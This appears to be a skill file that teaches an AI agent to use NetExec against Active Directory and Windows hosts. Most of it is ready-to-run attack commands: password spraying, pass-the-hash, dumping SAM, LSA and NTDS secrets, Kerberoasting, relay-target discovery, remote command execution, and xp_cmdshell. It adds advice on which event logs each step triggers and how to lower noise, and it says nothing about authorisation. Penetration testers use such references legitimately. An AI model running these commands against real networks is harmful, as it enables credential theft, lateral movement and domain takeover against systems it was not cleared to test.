---
name: netexec
description: "Run NetExec (nxc) across SMB, LDAP, WinRM, MSSQL, SSH, FTP, RDP, VNC, WMI and NFS for validated credential spray, share and session enumeration, secrets dumping and command execution. Use when testing Active Directory or Windows hosts with known or guessed credentials and hashes. Not for passive traffic capture (use mitmproxy) or ticket forging (use impacket)."
---

# NetExec

NetExec is the maintained successor to CrackMapExec: one binary, one credential set, every protocol. It is the fastest way to turn a username/password/hash list into validated access and then into shares, sessions, registry secrets and code execution. Every action is authenticated and logged by the target, so treat each invocation as a visible event.

## When to use

| Goal | Protocol | Command shape |
| --- | --- | --- |
| Validate a credential across a subnet | smb | `nxc smb 10.0.0.0/24 -u user -p pass` |
| Enumerate shares and effective rights | smb | `nxc smb hosts.txt -u u -p p --shares` |
| Dump local SAM / LSA secrets | smb | `nxc smb host -u localadmin -p p --local-auth --sam --lsa` |
| Dump domain hashes (DCSync rights) | smb | `nxc smb dc -u u -p p --ntds` |
| Kerberoast / AS-REP roast | ldap | `nxc ldap dc -u u -p p --kerberoast out.txt` |
| Collect BloodHound data | ldap | `nxc ldap dc -u u -p p --bloodhound --collection All` |
| Find relay targets (signing off) | smb | `nxc smb 10.0.0.0/24 --gen-relay-list relay.txt` |
| Command execution | smb/winrm | `nxc smb host -u u -p p -x whoami` |
| MSSQL query | mssql | `nxc mssql host -u sa -p p -q "select @@version"` |

Do not use NetExec for what another tool does better: `impacket` for fine-grained ticket and relay control, `certipy` for AD CS, `bloodhound-python` when you need a collector that NetExec's LDAP module does not cover, `responder`/`mitm6` for poisoning.

## Prerequisites

- `nxc --version` must print `1.5.x` or newer. Install: `pipx install netexec` (this host already has it at `~/.local/bin/nxc`).
- Kerberos operations need a synchronised clock; container hosts drift.
- For `--ntds` you need DCSync rights (Domain Admin, or an account with replication privileges).
- Wordlists live at `/opt/wordlists/` (`users-top.txt`, `pass-top1m.txt`, `rockyou.txt`).

## Core invocations

```sh
# 1. password spray that keeps going past the first hit
nxc smb 10.10.10.0/24 -u users.txt -p 'Spring2026!' --continue-on-success

# 2. same, hashes instead of passwords (pass-the-hash)
nxc smb 10.10.10.0/24 -u administrator -H aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0

# 3. local account auth, then dump SAM + LSA in one pass
nxc smb 10.10.10.5 -u localadmin -p 'P@ssw0rd' --local-auth --sam --lsa

# 4. share, session and logged-on-user triage
nxc smb hosts.txt -u user -p pass --shares --sessions --loggedon-users --disks

# 5. domain recon over LDAP
nxc ldap dc01.corp.local -u user -p pass --users --groups --computers --pass-pol --active-users

# 6. roast and collect in one session
nxc ldap dc01.corp.local -u user -p pass --kerberoast kerb.txt --asreproast asrep.txt --find-delegation

# 7. BloodHound collection straight from nxc
nxc ldap dc01.corp.local -u user -p pass --bloodhound --collection All --dns-server 10.10.10.10

# 8. execution over SMB and WinRM
nxc smb host -u user -p pass -x 'whoami /all'
nxc winrm host -u user -p pass -X 'Get-Process | Select-Object -First 5'

# 9. MSSQL
nxc mssql 10.10.10.20 -u sa -p 'P@ssw0rd' -q "SELECT name FROM sys.databases"
nxc mssql 10.10.10.20 -u sa -p 'P@ssw0rd' --local-auth -q "EXEC xp_cmdshell 'whoami'"

# 10. pull files back without a shell
nxc smb host -u user -p pass --get-file 'C:\Users\Public\notes.txt' ./notes.txt
```

Kerberos path, after `impacket-getTGT`:

```sh
export KRB5CCNAME=/tmp/user.ccache
nxc smb dc01.corp.local -u user -k --use-kcache --shares
```

## Flags that matter

| Flag | Effect | Note |
| --- | --- | --- |
| `--continue-on-success` | keep spraying after a hit | without it, a valid pair halts that host |
| `--local-auth` | authenticate against local SAM, not the domain | required for workgroup hosts |
| `-H` | NT hash auth (pass-the-hash) | LM:NT or plain NT |
| `-k` / `--use-kcache` | Kerberos from a ccache | set `KRB5CCNAME` |
| `--exec-method` | `wmiexec`, `smbexec`, `atexec`, `mmcexec` | WMI leaves different telemetry than service creation |
| `--sam` / `--lsa` / `--ntds` | registry and DIT dumping | noisy; `--ntds` is the loudest |
| `--shares` | share enumeration with access | pair with `-M spider_plus` to walk them |
| `--gen-relay-list` | hosts with SMB signing off | feed to `ntlmrelayx` |
| `-M <module>` / `-L` | run / list modules | `spider_plus`, `lsassy`, `handlekatz` ship here |
| `--generate-hosts-file` | write `/etc/hosts` entries | needed for name-based Kerberos |

## Workflow

1. **Validate before you enumerate.** Spray with `--continue-on-success`; note which hosts return `[+]` versus `STATUS_LOGON_FAILURE`.
2. **Read the host before you touch it.** `--pass-pol` and `--shares` are cheap; `--sam` is not.
3. **Escalate along the credential graph.** Local admin on one host → `--lsa` → cached domain credentials → spray those domain-wide.
4. **Collect for graphing.** `--bloodhound --collection All` once; analyse offline rather than re-querying the DC.
5. **Execute last.** `-x`/`-X` create service or WMI artefacts; prefer read-only collection first.

## OPSEC and telemetry

- Every SMB auth writes 4624/4625 on the target; spraying a /24 lights up the SOC.
- `--sam` reads `HKLM\SAM`; `--lsa` reads `SECURITY`; `--ntds` performs DRSUAPI replication and is trivially detectable (4662, directory-service access).
- `--exec-method smbexec` creates and deletes a service (7045 + 4697); `wmiexec` leaves `WmiPrvSE.exe` parented processes.
- LDAP queries land in the DC's 1644 events only with expensive logging enabled; Kerberoasting shows as 4769 with RC4 encryption.
- Rate-limit with `--threads` and `--jitter`; default concurrency is loud and can lock accounts.

## Failure modes

| Symptom | Cause | Fix |
| --- | --- | --- |
| `STATUS_LOGON_FAILURE` everywhere | wrong domain or local vs domain auth | add `-d DOMAIN` or `--local-auth` |
| `STATUS_ACCESS_DENIED` on `--sam` | authenticated but not local admin | check `--local-auth` and group membership |
| `KRB_AP_ERR_SKEW` | clock drift > 5 min | `chronyc makestep` or use NTLM |
| `--ntds` returns nothing | no replication rights | use `secretsdump.py -just-dc-user` or get DA first |
| SMB connections hang | port 445 filtered or SMB1-only host | `--port 139`, `nmap -p445` first |
| LDAP bind fails with signing errors | channel binding required | try `--simple-bind`, or use Kerberos |
| `--bloodhound` writes no zip | missing `--collection` or DNS | pass `--dns-server <dc>` |

## Verification

```sh
nxc --version                      # 1.5.x
nxc smb --help | head -20          # protocol parser alive
nxc smb 127.0.0.1 -u x -p x        # expect a clean connection error, not a traceback
```

Evidence to keep: the command line, the timestamp, the target list, and the raw `[+]`/`[-]` output per host.

## Related skills

- [impacket](../impacket/SKILL.md) for relay, tickets, and per-service scripts
- [certipy](../certipy/SKILL.md) for AD CS
- [bloodhound-python](../bloodhound-python/SKILL.md) for graph collection
- [evil-winrm](../evil-winrm/SKILL.md) for interactive shells
- [toolchain-router](../toolchain-router/SKILL.md) to pick a different tool